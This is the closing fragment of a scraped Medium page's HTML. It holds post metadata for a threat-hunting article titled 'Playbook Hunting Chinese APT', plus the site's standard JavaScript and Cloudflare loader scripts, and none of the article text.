hareKeyCreator":null},"creator":{"__ref":"User:3d60ce83d2f7"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fdetect.fyi\u002Fplaybook-hunting-chinese-apt-379a6b950492","primaryTopic":null,"topics":[],"isPublished":true,"latestPublishedVersion":"dcff7a17d5b3","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":0},"clapCount":112,"allowResponses":true,"isLimitedState":false,"title":"Playbook Hunting Chinese APT","isSeries":false,"sequence":null,"uniqueSlug":"playbook-hunting-chinese-apt-379a6b950492","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1736183931457,"readingTime":27.82861635220126,"previewContent":{"__typename":"PreviewContent","subtitle":"Chinese APT TTPs and LOLBAS Operations"},"previewImage":{"__ref":"ImageMetadata:1*ZK1JsZwQFLuKJif9jE-KeA.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1735773864530,"updatedAt":1736183931576,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:379a6b950492-viewerId:lo_a14f4be3b504"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:cybersecurity"},{"__ref":"Tag:threat-intelligence"},{"__ref":"Tag:threat-hunting"},{"__ref":"Tag:china"},{"__ref":"Tag:detection-engineering"}],"isNewsletter":false,"statusForCollection":"APPROVED","pendingCollection":null,"detectedLanguage":"en","wordCount":7273,"layerCake":0,"responsesLocked":false}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.1b75cd39.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.bc924586.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9120.5df29668.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2707.a4e221ac.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.933c1c9a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8599.73cb8339.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8346.be5bef41.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4863.28ab43f6.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6589.ab860fa4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.0f82ef97.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.7c45541d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.8aa8d357.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4492.3e85e9f5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.1c286b32.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3259.1779fbde.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.60bcefe8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.ca29bb88.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5794.9e8ff5dd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8204.e2639348.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.111f755f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8414.6565ad5f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.8d3e0217.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.21406717.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.0eb77899.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/responses.editor.5a11f4da.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8fff5611389c6d75',t:'MTczNjU0MDA5Ny4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8fff5611389c6d75","version":"2024.10.5","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"0b5f665943484354a59c39c6833f7078","b":1}' crossorigin="anonymous"></script>
</body></html>